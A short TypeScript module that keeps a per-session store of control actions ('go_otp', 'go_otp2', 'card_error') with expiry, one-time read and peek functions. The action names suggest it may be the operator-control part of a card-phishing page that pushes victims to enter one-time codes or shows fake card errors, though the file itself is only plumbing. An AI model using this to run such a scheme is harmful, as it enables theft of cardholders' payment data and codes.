export type ControlAction = "go_otp" | "go_otp2" | "card_error";

interface ControlEntry {
  action: ControlAction;
  setAt: number;
}

const store = new Map<string, ControlEntry>();

const TTL_MS = 60 * 60 * 1000;

function cleanup() {
  const now = Date.now();
  for (const [key, entry] of store) {
    if (now - entry.setAt > TTL_MS) store.delete(key);
  }
}
setInterval(cleanup, 5 * 60 * 1000);

export function setControl(sessionId: string, action: ControlAction): void {
  store.set(sessionId, { action, setAt: Date.now() });
}

export function getControl(sessionId: string): ControlAction | null {
  const entry = store.get(sessionId);
  if (!entry) return null;
  if (Date.now() - entry.setAt > TTL_MS) {
    store.delete(sessionId);
    return null;
  }
  store.delete(sessionId);
  return entry.action;
}

export function peekControl(sessionId: string): ControlAction | null {
  const entry = store.get(sessionId);
  if (!entry) return null;
  return entry.action;
}
